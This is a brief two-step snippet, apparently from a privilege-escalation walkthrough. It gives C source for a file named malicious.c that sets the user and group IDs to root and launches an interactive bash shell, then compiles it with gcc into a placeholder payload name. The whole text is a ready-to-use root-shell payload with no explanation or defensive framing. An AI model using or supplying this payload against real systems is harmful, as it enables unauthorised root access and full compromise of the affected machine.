1. First we create a `malicious.c` and compile it
```
#include <unistd.h>
#include <stdlib.h>
int main() {
  setuid(0);
  setgid(0);
  execl("/bin/bash", "bash", "-i", NULL);
  return 0;
}
```
2. Compile it
```
gcc -o <payloadname> malicious.c
```
